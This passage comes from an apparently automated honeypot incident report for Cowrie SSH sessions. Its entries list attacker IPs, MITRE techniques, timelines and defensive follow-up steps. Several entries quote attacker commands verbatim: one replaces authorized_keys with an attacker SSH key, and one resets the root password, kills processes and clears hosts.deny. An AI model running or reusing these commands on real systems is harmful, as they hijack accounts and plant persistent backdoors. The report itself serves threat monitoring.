| `2026-05-20 05:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c10dd392258

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]114` |
| **First Seen** | 2026-05-20 05:59 |
| **Last Seen** | 2026-05-20 05:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:59:04` | `cowrie.session.connect` |
| `2026-05-20 05:59:04` | `cowrie.client.version` |
| `2026-05-20 05:59:04` | `cowrie.client.kex` |
| `2026-05-20 05:59:04` | `cowrie.login.success` |
| `2026-05-20 05:59:04` | `cowrie.session.params` |
| `2026-05-20 05:59:04` | `cowrie.command.input` |
| `2026-05-20 05:59:04` | `cowrie.command.failed` |
| `2026-05-20 05:59:04` | `cowrie.log.closed` |
| `2026-05-20 05:59:04` | `cowrie.session.params` |
| `2026-05-20 05:59:04` | `cowrie.command.input` |
| `2026-05-20 05:59:04` | `cowrie.session.file_download` |
| `2026-05-20 05:59:04` | `cowrie.log.closed` |
| `2026-05-20 05:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]114` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd30fb8f1a1

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]114` |
| **First Seen** | 2026-05-20 05:59 |
| **Last Seen** | 2026-05-20 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:59:06` | `cowrie.session.connect` |
| `2026-05-20 05:59:06` | `cowrie.client.version` |
| `2026-05-20 05:59:06` | `cowrie.client.kex` |
| `2026-05-20 05:59:06` | `cowrie.login.success` |
| `2026-05-20 05:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]114` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e9d909b4014

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:59 |
| **Last Seen** | 2026-05-20 05:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:59:18` | `cowrie.session.connect` |
| `2026-05-20 05:59:18` | `cowrie.client.version` |
| `2026-05-20 05:59:18` | `cowrie.client.kex` |
| `2026-05-20 05:59:19` | `cowrie.login.success` |
| `2026-05-20 05:59:19` | `cowrie.session.params` |
| `2026-05-20 05:59:19` | `cowrie.command.input` |
| `2026-05-20 05:59:19` | `cowrie.command.failed` |
| `2026-05-20 05:59:19` | `cowrie.log.closed` |
| `2026-05-20 05:59:19` | `cowrie.session.params` |
| `2026-05-20 05:59:19` | `cowrie.command.input` |
| `2026-05-20 05:59:19` | `cowrie.session.file_download` |
| `2026-05-20 05:59:19` | `cowrie.log.closed` |
| `2026-05-20 05:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e663e020139

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:59 |
| **Last Seen** | 2026-05-20 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:59:21` | `cowrie.session.connect` |
| `2026-05-20 05:59:21` | `cowrie.client.version` |
| `2026-05-20 05:59:21` | `cowrie.client.kex` |
| `2026-05-20 05:59:21` | `cowrie.login.success` |
| `2026-05-20 05:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fe18d36a40

| Field | Detail |
|---|---|
| **Source IP** | `180.252.147[.]44` |
| **First Seen** | 2026-05-20 06:02 |
| **Last Seen** | 2026-05-20 06:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:02:49` | `cowrie.session.connect` |
| `2026-05-20 06:02:49` | `cowrie.client.version` |
| `2026-05-20 06:02:49` | `cowrie.client.kex` |
| `2026-05-20 06:02:49` | `cowrie.login.success` |
| `2026-05-20 06:02:49` | `cowrie.session.params` |
| `2026-05-20 06:02:49` | `cowrie.command.input` |
| `2026-05-20 06:02:49` | `cowrie.command.failed` |
| `2026-05-20 06:02:49` | `cowrie.log.closed` |
| `2026-05-20 06:02:50` | `cowrie.session.params` |
| `2026-05-20 06:02:50` | `cowrie.command.input` |
| `2026-05-20 06:02:50` | `cowrie.session.file_download` |
| `2026-05-20 06:02:50` | `cowrie.log.closed` |
| `2026-05-20 06:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.147[.]44` to AbuseIPDB if not already reported
- [ ] Block `180.252.147[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f53edcef7a6

| Field | Detail |
|---|---|
| **Source IP** | `180.252.147[.]44` |
| **First Seen** | 2026-05-20 06:02 |
| **Last Seen** | 2026-05-20 06:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:02:51` | `cowrie.session.connect` |
| `2026-05-20 06:02:51` | `cowrie.client.version` |
| `2026-05-20 06:02:51` | `cowrie.client.kex` |
| `2026-05-20 06:02:52` | `cowrie.login.success` |
| `2026-05-20 06:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.147[.]44` to AbuseIPDB if not already reported
- [ ] Block `180.252.147[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63769e9c30df

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]70` |
| **First Seen** | 2026-05-20 06:06 |
| **Last Seen** | 2026-05-20 06:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:06:09` | `cowrie.session.connect` |
| `2026-05-20 06:06:09` | `cowrie.client.version` |
| `2026-05-20 06:06:09` | `cowrie.client.kex` |
| `2026-05-20 06:06:10` | `cowrie.login.success` |
| `2026-05-20 06:06:10` | `cowrie.session.params` |
| `2026-05-20 06:06:10` | `cowrie.command.input` |
| `2026-05-20 06:06:10` | `cowrie.command.failed` |
| `2026-05-20 06:06:11` | `cowrie.log.closed` |
| `2026-05-20 06:06:11` | `cowrie.session.params` |
| `2026-05-20 06:06:11` | `cowrie.command.input` |
| `2026-05-20 06:06:11` | `cowrie.session.file_download` |
| `2026-05-20 06:06:11` | `cowrie.log.closed` |
| `2026-05-20 06:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1c8fb71280

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]70` |
| **First Seen** | 2026-05-20 06:06 |
| **Last Seen** | 2026-05-20 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:06:14` | `cowrie.session.connect` |
| `2026-05-20 06:06:14` | `cowrie.client.version` |
| `2026-05-20 06:06:14` | `cowrie.client.kex` |
| `2026-05-20 06:06:15` | `cowrie.login.success` |
| `2026-05-20 06:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a3e51581d4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]174` |
| **First Seen** | 2026-05-20 06:07 |
| **Last Seen** | 2026-05-20 06:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:07:58` | `cowrie.session.connect` |
| `2026-05-20 06:07:58` | `cowrie.client.version` |
| `2026-05-20 06:07:59` | `cowrie.client.kex` |
| `2026-05-20 06:07:59` | `cowrie.login.success` |
| `2026-05-20 06:07:59` | `cowrie.session.params` |
| `2026-05-20 06:07:59` | `cowrie.command.input` |
| `2026-05-20 06:07:59` | `cowrie.command.failed` |
| `2026-05-20 06:08:00` | `cowrie.log.closed` |
| `2026-05-20 06:08:00` | `cowrie.session.params` |
| `2026-05-20 06:08:00` | `cowrie.command.input` |
| `2026-05-20 06:08:00` | `cowrie.session.file_download` |
| `2026-05-20 06:08:00` | `cowrie.log.closed` |
| `2026-05-20 06:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d7ec89a8e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]174` |
| **First Seen** | 2026-05-20 06:08 |
| **Last Seen** | 2026-05-20 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:08:02` | `cowrie.session.connect` |
| `2026-05-20 06:08:02` | `cowrie.client.version` |
| `2026-05-20 06:08:02` | `cowrie.client.kex` |
| `2026-05-20 06:08:03` | `cowrie.login.success` |
| `2026-05-20 06:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7e50bf8f1f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]174` |
| **First Seen** | 2026-05-20 06:08 |
| **Last Seen** | 2026-05-20 06:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:08:32` | `cowrie.session.connect` |
| `2026-05-20 06:08:32` | `cowrie.client.version` |
| `2026-05-20 06:08:32` | `cowrie.client.kex` |
| `2026-05-20 06:08:33` | `cowrie.login.success` |
| `2026-05-20 06:08:33` | `cowrie.session.params` |
| `2026-05-20 06:08:33` | `cowrie.command.input` |
| `2026-05-20 06:08:33` | `cowrie.command.failed` |
| `2026-05-20 06:08:33` | `cowrie.log.closed` |
| `2026-05-20 06:08:34` | `cowrie.session.params` |
| `2026-05-20 06:08:34` | `cowrie.command.input` |
| `2026-05-20 06:08:34` | `cowrie.session.file_download` |
| `2026-05-20 06:08:34` | `cowrie.log.closed` |
| `2026-05-20 06:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf322ccb2f45

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]174` |
| **First Seen** | 2026-05-20 06:08 |
| **Last Seen** | 2026-05-20 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 06:08:36` | `cowrie.session.connect` |
| `2026-05-20 06:08:36` | `cowrie.client.version` |
| `2026-05-20 06:08:36` | `cowrie.client.kex` |
| `2026-05-20 06:08:36` | `cowrie.login.success` |
| `2026-05-20 06:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6bd47fca65

| Field | Detail |
|---|---|
| **Source IP** | `46.6.125[.]137` |
| **First Seen** | 2026-05-20 07:06 |
| **Last Seen** | 2026-05-20 07:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pRU9eDo5ZrFq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 07:06:12` | `cowrie.session.connect` |
| `2026-05-20 07:06:12` | `cowrie.client.version` |
| `2026-05-20 07:06:12` | `cowrie.client.kex` |
| `2026-05-20 07:06:12` | `cowrie.login.success` |
| `2026-05-20 07:06:13` | `cowrie.session.params` |
| `2026-05-20 07:06:13` | `cowrie.command.input` |
| `2026-05-20 07:06:13` | `cowrie.command.failed` |
| `2026-05-20 07:06:13` | `cowrie.log.closed` |
| `2026-05-20 07:06:13` | `cowrie.session.params` |
| `2026-05-20 07:06:13` | `cowrie.command.input` |
| `2026-05-20 07:06:13` | `cowrie.session.file_download` |
| `2026-05-20 07:06:13` | `cowrie.log.closed` |
| `2026-05-20 07:06:15` | `cowrie.session.params` |
| `2026-05-20 07:06:15` | `cowrie.command.input` |
| `2026-05-20 07:06:15` | `cowrie.log.closed` |
| `2026-05-20 07:06:16` | `cowrie.session.params` |
| `2026-05-20 07:06:16` | `cowrie.command.input` |
| `2026-05-20 07:06:16` | `cowrie.log.closed` |
| `2026-05-20 07:06:16` | `cowrie.session.params` |
| `2026-05-20 07:06:16` | `cowrie.command.input` |
| `2026-05-20 07:06:16` | `cowrie.session.file_download` |
| `2026-05-20 07:06:16` | `cowrie.log.closed` |
| `2026-05-20 07:06:17` | `cowrie.session.params` |
| `2026-05-20 07:06:17` | `cowrie.command.input` |
| `2026-05-20 07:06:17` | `cowrie.log.closed` |
| `2026-05-20 07:06:17` | `cowrie.session.params` |
| `2026-05-20 07:06:17` | `cowrie.command.input` |
| `2026-05-20 07:06:17` | `cowrie.log.closed` |
| `2026-05-20 07:06:18` | `cowrie.session.params` |
| `2026-05-20 07:06:18` | `cowrie.command.input` |
| `2026-05-20 07:06:18` | `cowrie.command.input` |
| `2026-05-20 07:06:18` | `cowrie.log.closed` |
| `2026-05-20 07:06:18` | `cowrie.session.params` |
| `2026-05-20 07:06:18` | `cowrie.command.input` |
| `2026-05-20 07:06:18` | `cowrie.log.closed` |
| `2026-05-20 07:06:18` | `cowrie.session.params` |
| `2026-05-20 07:06:18` | `cowrie.command.input` |
| `2026-05-20 07:06:19` | `cowrie.log.closed` |
| `2026-05-20 07:06:19` | `cowrie.session.params` |
| `2026-05-20 07:06:19` | `cowrie.command.input` |
| `2026-05-20 07:06:19` | `cowrie.log.closed` |
| `2026-05-20 07:06:19` | `cowrie.session.params` |
| `2026-05-20 07:06:19` | `cowrie.command.input` |
| `2026-05-20 07:06:19` | `cowrie.log.closed` |
| `2026-05-20 07:06:20` | `cowrie.session.params` |
| `2026-05-20 07:06:20` | `cowrie.command.input` |
| `2026-05-20 07:06:20` | `cowrie.log.closed` |
| `2026-05-20 07:06:20` | `cowrie.session.params` |
| `2026-05-20 07:06:20` | `cowrie.command.input` |
| `2026-05-20 07:06:20` | `cowrie.log.closed` |
| `2026-05-20 07:06:21` | `cowrie.session.params` |
| `2026-05-20 07:06:21` | `cowrie.command.input` |
| `2026-05-20 07:06:21` | `cowrie.log.closed` |
| `2026-05-20 07:06:21` | `cowrie.session.params` |
| `2026-05-20 07:06:21` | `cowrie.command.input` |
| `2026-05-20 07:06:21` | `cowrie.log.closed` |
| `2026-05-20 07:06:22` | `cowrie.session.params` |
| `2026-05-20 07:06:22` | `cowrie.command.input` |
| `2026-05-20 07:06:22` | `cowrie.log.closed` |
| `2026-05-20 07:06:22` | `cowrie.session.params` |
| `2026-05-20 07:06:22` | `cowrie.command.input` |
| `2026-05-20 07:06:22` | `cowrie.log.closed` |
| `2026-05-20 07:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.6.125[.]137` to AbuseIPDB if not already reported
- [ ] Block `46.6.125[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08374d54d281

| Field | Detail |
|---|---|
| **Source IP** | `46.6.125[.]137` |
| **First Seen** | 2026-05-20 07:06 |
| **Last Seen** | 2026-05-20 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 07:06:43` | `cowrie.session.connect` |
| `2026-05-20 07:06:43` | `cowrie.client.version` |
| `2026-05-20 07:06:43` | `cowrie.client.kex` |
| `2026-05-20 07:06:44` | `cowrie.login.success` |
| `2026-05-20 07:06:44` | `cowrie.session.params` |
| `2026-05-20 07:06:44` | `cowrie.command.input` |
| `2026-05-20 07:06:44` | `cowrie.command.failed` |
| `2026-05-20 07:06:44` | `cowrie.log.closed` |
| `2026-05-20 07:06:44` | `cowrie.session.params` |
| `2026-05-20 07:06:44` | `cowrie.command.input` |
| `2026-05-20 07:06:45` | `cowrie.session.file_download` |
| `2026-05-20 07:06:45` | `cowrie.log.closed` |
| `2026-05-20 07:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.6.125[.]137` to AbuseIPDB if not already reported
- [ ] Block `46.6.125[.]137` at perimeter firewall / security group
